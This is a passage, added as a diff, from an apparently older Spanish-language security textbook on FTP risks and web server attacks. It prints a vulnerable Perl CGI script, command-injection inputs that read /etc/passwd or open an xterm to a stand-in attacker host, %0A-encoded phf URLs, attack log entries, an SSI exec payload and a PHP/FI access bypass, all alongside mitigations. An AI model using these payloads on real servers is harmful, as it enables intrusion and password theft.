@@ -1,0 +1,149 @@
+4.4.6 - Otros problemas del FTP
+El FTP y los programas que lo implementan son reales problemas para los
+encargados de seguridad de los sistemas. Veamos una lista parcial de los mismos:
+· El protocolo, como hemos visto, usa dos conexiones TCP, complicando el
+trabajo de controlarlo a través de un firewall. En la mayoría de los casos un
+control de una conexión saliente requiere una conexión entrante de datos.
+· El demonio ftpd corre inicialmente como root, ya que normalmente procesa un
+login a determinada cuenta, incluyendo el procesamiento de la password. Peor
+aun, no puede dejar su privilegio despues del login, el protocolo requiere
+conexión al port 20 el cual esté en el rango privilegiado.
+· Históricamente, han habido bugs en la implementación del demonio, lo cual ha
+producido grandes problemas de seguridad
+Por otra parte, el FTP anónimo se ha convertido en un standard de internet para
+distribuir software, documentos, etc. No hay duda que es un servicio útil, pero debe ser
+administrado con sumo cuidado.
+La primera regla es que ningún archivo o directorio en el area de FTP anónimo
+debe ser poseida por el login ftp , ya que el FTP anónimo corre con esa identificación
+de usuario.
+La siguiente regla es evitar colocar un archivo real /etc/passwd en el area de FTP
+anónimo. Hay que crear aquí un /etc/passwd “dummy”, con cuentas inexistentes y sin
+passwords reales encriptadas. En muchos caso se ha colocado aquí el /etc/passwd real,
+dando servido al hacker las passwords encriptadas para así hacer un ataque de
+diccionario.
+Crear o no un directorio público de acceso read/write es tema de controversia. No
+hay duda que es útil hacerlo, pero se puede abusar fácil de ello. Uno puede encontrarse
+con su server convertido en repositorio de software pirata, por ejemplo. Este repositorio
+puede ser temporario o permanente, en el primer caso, hackers pueden usar su sitio
+como lugar de tránsito, consumiendo sus recursos.
+4.5 - Seguridad en WWW
+En este apartado se verán las vulnerabilidades más comunes encontradas en los
+servidores de Web. Vía WWW, el demonio httpd se ha convertido rápidamente en una
+de las primeras "puntas de ataque" de los hackers. Es común ver reportes de los CERT
+que informan vulnerabilidades tales como el PHF (servicio de directorio “White pages” )
+en muchos servers, y las hay menos conocidas, como los scripts "query", y "prueba-cgi
+".
+Existen dos caras de seguridad del webserver, una es proteger el sistema
+operativo en sí mismo de ser atacado vía WWW, la otra es proteger un Website en sí
+mismo de acceso no autorizado.
+Atacar el sistema operativo vía WWW implica generalmente “trampear” un cgi
+script o lograr que el webserver haga algo que no fue pensado que haga, como por
+ejemplo dar al hacker acceso al shell del host, que ese hacker ejecute comandos
+arbitrarios en él , o le provea información útil para lograr esos objetivos.
+Es obvio que los datos provistos a cualquier cgi script vía un form deben ser
+probados para su validez por una razón u otra, y una de esas razones indudablemente
+es la seguridad.
+Dependiendo de lo que el script vaya a hacer, la entrada aparentemente inocua de
+información puede tener graves consecuencias.
+Por ejemplo, consideremos el siguiente script en perl en el cual se realiza un finger
+al usuario que se indico en el campo de entrada del form y vuelvan los resultados al
+web browser ( Script encontrado frecuentemente en websites ):
+#!/usr/local/bin/perl
+$|=1;
+require 'cgi-lib.pl';
+&ReadParse;
+print &PrintHeader;
+open(IN, "/usr/bin/finger $in{'user_id'} |");
+@stuff=;
+foreach(@stuff) { print; }
+exit;
+e ingresamos como usuario lo siguiente:
+kaiser;/bin/cat / etc/passwd
+Si no se posee soporte de shadow passwords, se está en graves problemas. Lo
+precedente constituye un ejemplo muy básico de la forma que un " password grab”
+podría tomar. El tema es que el string podría contener cualquier comando arbitrario,
+como por ejemplo:
+kaiser;/usr/openwin/xterm - display hackerz.R.US.com
+Esto abriría un xterm en su consola, y además su shell tendría los mismos
+permisos que el demonio del httpd.
+Por supuesto, el ejemplo antedicho no controló si la entrada en el form era un
+usuario o una bomba atómica, y dondequiera que uno vaya va a encontrar que en la
+documentación o en los ejemplos de manejo de input cgi se explica siempre que hay
+que realizar un “escape” de cualquier meta-character de relevencia al shell con
+backslashes. Sin embargo, la situación fue calamitosa debido a que muchos ejemplos
+omitieron un pequeño carácter especial, a saber el newline (0x0A).
+Las versiones viejas del httpd del NCSA y Apache (1,0,3) tenían una rutina de C,
+escape_shell_cmd() en su distribución que tenía este defecto.
+Por lo tanto, cualquier persona que hacía uso de la función usando el módulo
+util.c compiló esa vulnerabilidad en sus cgi scripts.
+Una manera de explotar este bug es con el string:
+http://somewhere.com/cgibin/
+somescript?fakedata%0A/bin/cat%20/etc/passwd
+o por ejemplo utilizando como string:
+fakedata%0a/usr/openwin/xterm%20-display%20hackerz.R.US.com
+Si se descubre en el log de acceso cosas como:
+nserv.tsa.de - - [13/Dec/1996:00:03:13 -0500] \
+"GET /cgi-bin/phf?Qname=asd%0acat%20/etc/passwd HTTP/1.0" 200 1467
+www3-leav.army.mil - - [28/Dec/1996:10:04:59 -0500] \
+"GET /cgi-bin/phf/?Qalias=x%ff/bin/cat%20/etc/passwd" 200 -
+ld49-037.compuserve.com - - [12/Jan/1997:06:54:22 -0500] \
+"GET /cgi-bin/phf?Qalias=x%0a/usr/bin/id HTTP/1.0" 200 -
+significa que hackers han intentado ya esto en su sistema.
+El problema además está en que al migrar a versiones nuevas muchas veces se
+copia el árbol de binarios cgi viejos encima del nuevo, arrastrando este bug.
+Por otra parte, el shell bash tiene un problema comparable: el decimal 255 es
+interpretado como separador de comandos.
+Durante los 2 últimos años pasados , en los cuales se extendió el uso de
+documentos dinámicos , otras vulnerabilidades entraron en escena
+En primer término, la manera mas fácil para los webservers de construir
+documentos “on fly” , era habilitar los Server Side Includes (SSI’s).
+En algunos casos esto significó una extensión nueva de archivo, como shtml , en
+otros significó permitir SSI´s para cada documento en el servidor o en un árbol dado
+del documento. En cualquier caso, permitir SSÍs permite un exec.
+Un uso legítimo típico de un “exec tag” es:
+Esta página ha sido visitada <! -- #exec cgi="/cgi-bin/counter " -- > veces
+Pero imaginemos un sistema de mensajería de alguna clase basado en HTML, por
+ejemplo un “guestbook” que toma el input y construye un doc HTML.
+Alguien entra y deja:
+Hey! Que buen lugar, volveré seguido ; -)
+<! -- #exec cmd="/bin/cat /etc/passwd " -- >
+Si no se está analizando los campos ingresado nuevamente tenemos un “password
+grab”. O podría introducirse cualquier cosa que el server pudiera ejecutar. Y además
+sería mucho peor si su webserver se ejecuta como root.
+Las últimas versiones de Apache y Netscape proporcionan como opción invalidar
+los SSI’s de tal manera que se pueden habilitar sin el " exec ".
+Muchos de estos problemas se pueden reducir permitiendo el “chrooting” del web
+server, aunque a pesar de los aumentos que se hacen de seguridad, estos no son de
+ninguna forma un ejercicio trivial.
+Hay otros aspectos a la seguridad del webserver además de hackear el s/o.
+Incluso si se es “seguro” en este aspecto, está el website en si mismo. Más y más de
+ellos requieren el acceso asegurado para una razón u otra.
+Mientras que los websites realizan la transición de ser “frees” a pagos y mezclan
+sus intranets con los extranets, las restricciones de acceso entran en juego.
+Cualquier archivo de passwords usado para la autenticación del Web debe estar
+fuera del árbol de documentos. En efecto, muchos administradores lo dejaban en el
+árbol pensando que al haber un “index file” este archivo sería invisible. Grave error: El
+archivo se puede adivinar, en primer término, y además han surgido herramientas que
+permiten conseguir el listado del webserver aun cuando el “index file” esta presente. De
+esta manera, obtenido el archivo de passwords, es facil correr el “crack” y decifrarla.
+También se debe estar prevenido que dependiendo de lo que hace su website, y
+como está implementado, puede haber otros accesos no autorizados que el server web
+estándar no atrapará. Un buen ejemplo de esto son del “cgi wrappers” tales como
+PHP/FI o W3-mSQL.
+Por ejemplo, si alguien sabe el nombre de un documento al que se quiere tener
+acceso en el directorio protegido ( index.html ) puede conseguirse usando:
+http://somewhere.com/cgi-bin/php.cgi/secret/index.html
+En el caso de PHP/FI, se puede evitar esto definiendo PATTERN_RESTRICT en
+php.h antes de compilar, así que solamente cargará los archivos que terminan en la
+extensión .phtml.
+4.5.1 - Conclusión
+Se han descripto ataques comunes al WEB server, algunos antiguos y para los
+cuales se dispone de patches, pero estos ataques están en continua evolución,
+explotando bugs de los web servers, o descuidos de los administradores. Como
+recomendación general, además de ser cuidadoso en, particularmente, los scripts cgi,
+hay que revisar las configuraciones de acceso en el web server , los permisos con los
+que el mismo se ejecuta, y los directorios de datos expuestos.
+Otros tipos de ataques no han comprometido los datos del sistema, pero han
+hecho caer al web server: uno muy común explotaba un bug del Internet Information
+Server de Microsoft, disponible con el Windows NT, que no soportaba URL’s mayores de
+64 Kb.
